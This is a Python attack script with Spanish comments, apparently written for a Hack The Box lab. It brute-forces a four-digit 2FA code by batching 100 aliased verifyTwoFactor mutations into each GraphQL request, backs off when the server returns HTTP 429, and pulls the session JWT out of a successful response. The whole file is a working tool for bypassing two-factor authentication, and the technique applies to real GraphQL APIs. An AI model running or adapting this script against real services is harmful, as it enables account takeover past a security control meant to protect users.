import sys
import signal
import requests
import re
from argparse import ArgumentParser
from time import sleep

def exit_handler(sig, frame):
    print("\n[!] Saliendo de la aplicación de forma segura...")
    sys.exit(0)

signal.signal(signal.SIGINT, exit_handler)

BASE_URL = "http://speednet.htb:31363/graphql"

def get_template(two_factor_token, start_otp, end_otp, digits=4):
    """Genera la mutación agrupada formateando los OTPs con ceros a la izquierda."""
    template = "mutation {"
    for otp in range(start_otp, end_otp):
        # Formatea el número con ceros a la izquierda (ej: 0001)
        otp_str = str(otp).zfill(digits)
        template += f'a{otp_str}: verifyTwoFactor(token: "{two_factor_token}", otp: "{otp_str}") {{ token }} '
    template += "}"
    return template

def send_request(template, retries=3):
    """Envía la petición controlando el rate-limit y procesando la respuesta."""
    headers = {"Content-Type": "application/json"}
    payload = {"query": template}
    jwt_pattern = r'[A-Za-z0-9\-_+=]+\.[A-Za-z0-9\-_+=]+\.[A-Za-z0-9\-_+=]+'

    for attempt in range(retries):
        try:
            response = requests.post(BASE_URL, headers=headers, json=payload, timeout=10)

            if response.status_code == 429:
                print(f"[!] Código 429 recibido. Esperando 5 segundos (Intento {attempt+1}/{retries})...")
                sleep(5)
                continue

            # Búsqueda del token válido en la respuesta
            match = re.search(jwt_pattern, response.text)
            if match:
                print(f"\n[+] ¡ÉXITO! JWT Token encontrado: {match.group(0)}")
                sys.exit(0)

            return # Si no hay match pero la petición fue 200, salimos de la función de manera limpia

        except requests.exceptions.RequestException as e:
            print(f"[-] Error de conexión: {e}. Reintentando...")
            sleep(2)

    print("[-] Error: No se pudo procesar este lote tras varios intentos.")

def brute_force(two_factor_token, digits=4):
    """Gestiona el rango completo de OTPs dinámicamente."""
    # Calcula el límite superior según el número de dígitos (ej: 4 dígitos = 10000)
    max_value = 10 ** digits
    batch_size = 100

    print(f"[*] Iniciando ataque de fuerza bruta por lotes (0 a {max_value-1})...")

    for otp in range(0, max_value, batch_size):
        end_otp = min(otp + batch_size, max_value)
        print(f"[*] Probando rango OTP: {str(otp).zfill(digits)} - {str(end_otp-1).zfill(digits)}")

        template = get_template(two_factor_token, otp, end_otp, digits)
        send_request(template)
        sleep(1) 

if __name__ == '__main__':
    parser = ArgumentParser(description="GraphQL 2FA Batching Tool para Laboratorios")
    parser.add_argument("-f", "--two_factor", help="Token de sesión 2FA requerido", required=True)
    parser.add_argument("-d", "--digits", help="Número de dígitos del OTP (por defecto 4)", type=int, default=4)

    args = parser.parse_args()
    brute_force(args.two_factor, args.digits)
